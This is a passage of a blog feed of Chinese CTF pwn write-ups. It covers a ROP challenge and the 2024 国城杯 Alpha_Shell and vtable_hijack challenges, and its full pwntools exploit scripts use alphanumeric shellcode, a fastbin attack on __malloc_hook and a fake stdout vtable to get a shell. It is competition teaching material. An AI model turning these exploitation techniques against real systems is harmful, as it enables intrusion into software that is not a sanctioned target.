ã€‚</li><li>syscallçš„<code>rax</code>éš¾ä»¥æ§åˆ¶ã€‚ä½†ç”±äºç¬¬äºŒæ¬¡è¯»å–æ—¶ï¼Œreadå‡½æ•°ä¼šè¿”å›è¯»å–çš„å­—ç¬¦æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™æ¬¡readæ§åˆ¶rax</li><li>åœ¨ç¬¬ä¸‰å…³æ—¶ï¼Œç¨‹åºçš„æ ‡å‡†é”™è¯¯æµå’Œæ ‡å‡†è¾“å‡ºæµéƒ½ä¼šè¢«å…³é—­ï¼Œå¯¼è‡´ç¨‹åºæ— å›æ˜¾ã€‚æ­¤å¤„å¯ä»¥åˆ©ç”¨<code>exec 1&gt;&amp;0</code>å‘½ä»¤ï¼Œå°†stdouté‡å®šå‘åˆ°stdinï¼Œç”±äºstdinä¸­çš„å†…å®¹å®é™…ä¸Šä¼šå¯¹æˆ‘ä»¬æ˜¾ç¤º(shellçš„å›æ˜¾æœºåˆ¶ï¼Œä½ çš„è¾“å…¥ä¼šè¢«æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚ä¸ªåˆ«è¾“å…¥æ¯”å¦‚sudoçš„å¯†ç ä¸ä¼šå›æ˜¾)ï¼Œæ‰€ä»¥shellå®é™…ä¸Šä¼šæ¢å¤æ­£å¸¸ã€‚æ³¨æ„ï¼Œè¿™é‡Œåªæœ‰é€šè¿‡è¿œç¨‹æ‰èƒ½å®ç°ã€‚æœ¬åœ°è¿™æ ·åšæ˜¯è¡Œä¸é€šçš„ï¼Œè¿™æœ‰å¯èƒ½æ˜¯å› ä¸ºstdinåªè¯»ã€é‡å®šå‘å¯¼è‡´å†²çªç­‰åŸå› ã€‚<strong>è¿™ä¹Ÿæ˜¯å¤§å¤šæ•°é¢˜è§£æœ¬åœ°å¤ç°å¤±è´¥çš„åŸå› ä¹‹ä¸€</strong>ã€‚<br>é¢˜è§£å¦‚ä¸‹ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-02-24 19:18:38</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn1&quot;</span><br>libcname = <span class="hljs-string">&quot;./libc-2.27.so&quot;</span><br>host = <span class="hljs-string">&quot;localhost&quot;</span><br>port = <span class="hljs-number">11451</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><br><br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;Sword!\n&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x25a8</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>).encode())<br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x602058</span>).encode())<br><br>io.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>pop_rdi = <span class="hljs-number">0x4013f4</span><br>bin_sh = <span class="hljs-number">0x4019d7</span><br>ret = <span class="hljs-number">0x4007fe</span><br>pop_rsi = <span class="hljs-number">0x4013f6</span><br>pop_rdx = <span class="hljs-number">0x4013f8</span><br>pop_rsp = <span class="hljs-number">0x4013fa</span><br>payload1 = p64(ret)*(<span class="hljs-number">0x16</span>) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(pop_rsp) + p64(<span class="hljs-number">0x602058</span>)<br>payload1 = payload1.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(payload1)<br>sleep(<span class="hljs-number">1</span>)<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x3b</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>io.sendline(<span class="hljs-string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å›½åŸæ¯2024wp</title>
    <link href="/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/"/>
    <url>/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="è°ƒæŸ¥é—®å·"><a href="#è°ƒæŸ¥é—®å·" class="headerlink" title="è°ƒæŸ¥é—®å·"></a>è°ƒæŸ¥é—®å·</h4><p>å¡«é—®å·å³å¾—flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h4><p>ç¦ç”¨äº†ä¸€å¤§ä¸²ç³»ç»Ÿè°ƒç”¨ï¼Œæ‹¿shellè‚¯å®šæ˜¯åˆ«æƒ³äº†ï¼Œåªèƒ½èµ°orwã€‚ä½†æ˜¯ä¼ ç»Ÿçš„orwè·¯çº¿ç»™banäº†ï¼Œåªèƒ½èµ°<code>openat</code>+<code>sendfile</code>ã€‚  </p><blockquote><p>æ³¨æ„ï¼Œä½¿ç”¨<code>pwrite</code>æ˜¯ä¸è¡Œçš„ï¼Œpwriteè¿‡ç¨‹ä¼šè°ƒç”¨writeå‡½æ•°ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿè°ƒç”¨æ— æ³•æ‰§è¡Œã€‚è¯¦è§æºç ï¼š<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/posix/pwrite64.c#L41</a></p></blockquote><p>å¦å¤–æ­¤é¢˜è¿˜é™åˆ¶äº†å¯è§å­—ç¬¦shellcodeï¼Œéœ€è¦ç”¨<code>alpha3</code>ç”Ÿæˆã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31796</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+428)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                s</span><br><span class="hljs-comment">#                catch syscall</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>flag = <span class="hljs-number">0x100000900</span><br><br>payload = shellcraft.openat(-<span class="hljs-number">100</span>, <span class="hljs-string">&quot;flag&quot;</span>)<br>payload += shellcraft.sendfile(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)<br>payload+= shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ss&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(asm(payload))<br>    <br>sc = <span class="hljs-string">b&quot;&quot;&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf\</span><br><span class="hljs-string">    1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3F7k\</span><br><span class="hljs-string">        4l0l1138124P0U3n060j7k0i0Z180p0k0Y090\</span><br><span class="hljs-string">            n133v2Z032k0Y0F0h09051k3X112l017o1o01&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sc))<br>io.send(sc)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h4><p>æ­¤é¢˜å¯ä»¥ç›´æ¥æ‰“<code>__malloc_hook</code>ï¼Œåˆ©ç”¨unsortedbinæ³„éœ²libc+fastbin attackæ‰“malloc_hookå³å¯æ‹¿åˆ°shellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31126</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>og = libc_base + <span class="hljs-number">0xd5c07</span><br><br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x13</span>+p64(og))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>è¡¥å……ä¸€ä¸‹æ‰“vtableçš„æ–¹æ³•ã€‚å®˜æ–¹wpçš„å †å¸ƒç½®ç­–ç•¥æœ‰é—®é¢˜ï¼Œä¼šæŠ¥é”™ã€‚<br>ä¸‹é¢çš„expæ‰“vtableæ—¶éº»çƒ¦äº†ï¼Œå…¶å®å¯ä»¥ç›´æ¥æ‰“<code>puts</code>ã€‚                                                                                                                                                                                                                                                     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                b execve</span><br><span class="hljs-comment">#                b exit </span><br><span class="hljs-comment">#                b _IO_unbuffer_all</span><br><span class="hljs-comment">#                b _IO_cleanup</span><br><span class="hljs-comment">#                b system</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31287</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;libc&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>xsputns = libc_base + <span class="hljs-number">0x70b60</span><br>overflow = libc_base + <span class="hljs-number">0x71880</span><br>IO_write = libc_base + <span class="hljs-number">0x70650</span><br>og = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>fake_heap = stdout_vtable_ptr-<span class="hljs-number">0x3b</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><br>fake_data = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x00ffffffff000000</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>* (<span class="hljs-number">0xb</span>+<span class="hljs-number">8</span>)+ p64(heap_1_addr+<span class="hljs-number">0x180</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(fake_heap))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br>fake_vtable = p64(og)* <span class="hljs-number">3</span> + p64(overflow)+ p64(og)*<span class="hljs-number">3</span>+ p64(xsputns) +p64(og)*<span class="hljs-number">3</span> +p64(og)+ p64(og)*<span class="hljs-number">3</span>  + p64(IO_write)<br>edit(<span class="hljs-number">5</span>, fake_vtable)<br>edit(<span class="hljs-number">4</span>, fake_data)<br><br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;og&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(og)&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">6</span>)<br>stdout_fake_heap = libc_base+libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="hljs-number">0x43</span><br>edit(<span class="hljs-number">6</span>, p64(stdout_fake_heap))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x33</span>+p32(<span class="hljs-number">0xfbad1880</span>)+<span class="hljs-string">b&quot;;sh;\x00&quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h4 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage 